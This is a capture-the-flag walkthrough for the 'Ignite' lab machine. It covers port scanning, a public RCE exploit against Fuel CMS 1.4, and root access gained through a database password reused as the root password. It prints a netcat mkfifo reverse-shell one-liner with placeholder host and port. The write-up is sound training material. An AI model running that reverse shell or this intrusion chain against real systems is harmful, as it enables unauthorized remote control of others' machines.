Ignite CTF – Full Walkthrough

Author: gl1tcH
Difficulty: Easy

1. Initial Enumeration

I began by performing a full port scan using Nmap to identify exposed services on the target machine. The results showed an HTTP service running on port 80, and the service banner indicated it was Fuel CMS.

<img width="761" height="337" alt="Nmap Scan" src="https://github.com/user-attachments/assets/90fd4d78-c10b-495a-8fc1-3855a7b58806" />

2. Inspecting the Web Application

After browsing to the HTTP service, I confirmed the application was running Fuel CMS version 1.4.

<img width="1909" height="872" alt="Fuel_CMS_Web" src="https://github.com/user-attachments/assets/32896fa3-d11d-4dff-ad98-b2cf7d79a2e8" />

3. Identifying and Executing an Exploit (RCE)

A quick search revealed that Fuel CMS 1.4 is vulnerable to Remote Code Execution (RCE).
I located a publicly available exploit written in Python and used it to gain RCE on the server. (https://github.com/Errahulaws/fuel-cms-1.4-RCA-exploit)

<img width="1919" height="800" alt="Fuel_RCE_github" src="https://github.com/user-attachments/assets/61c7d287-d7eb-4828-8b9a-146b7f8bf58c" />
<img width="202" height="230" alt="RCE_Conf" src="https://github.com/user-attachments/assets/c53a549c-293b-439d-a3b5-100b6c984b29" />

4. Obtaining a Reverse Shell

With RCE confirmed, I executed a reverse shell payload to gain an interactive shell on the target:

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc [IP ADDR] [PORT] >/tmp/f

I set up a Netcat listener on my machine and successfully received a shell.

<img width="530" height="212" alt="Rev_shell" src="https://github.com/user-attachments/assets/1c2a83e0-31b9-43ee-91b7-9c061a243004" />

5. Capturing the User Flag

Once inside the machine, I enumerated the filesystem and located the first user flag.
I was able to read and submit it.

<img width="130" height="97" alt="first_flag" src="https://github.com/user-attachments/assets/db745451-bc86-4e6d-a038-dba2ea85e49a" />

6. Privilege Escalation – Enumeration with LinPEAS

To escalate privileges, I uploaded and executed LinPEAS, a Linux enumeration tool that highlights potential attack vectors.

LinPEAS output revealed a particularly interesting line:

<img width="646" height="47" alt="linpeas_output" src="https://github.com/user-attachments/assets/395cd4e1-61cd-4d4a-89d2-7de434d92523" />

7. Investigating the Database Configuration File

I examined the database.php file manually and found the full database connection array.
Crucially, the username was set to root, and the password was the same one discovered by LinPEAS:

<img width="441" height="348" alt="database_passwd" src="https://github.com/user-attachments/assets/97351c3c-a55d-4062-b7b3-be63deda7431" />

This indicated that the root user on the system might reuse the same credentials.

8. Privilege Escalation to Root

I attempted to switch to the root user using:

"su root"

When prompted, I entered the password mememe, and access was granted.
This elevated me to full root privileges.

<img width="276" height="52" alt="login_root1" src="https://github.com/user-attachments/assets/1210b23b-277f-41cd-9c40-959ae8e8fa0c" />
<img width="141" height="16" alt="login_root2" src="https://github.com/user-attachments/assets/da111238-2db4-41da-9e36-8065cdbbadf2" />

9. Capturing the Root Flag

With root access, I navigated to the root directory and retrieved the root.txt flag to complete the challenge.

<img width="296" height="17" alt="rootflag" src="https://github.com/user-attachments/assets/72e9326a-9416-4ddb-80a5-c98995491b89" />

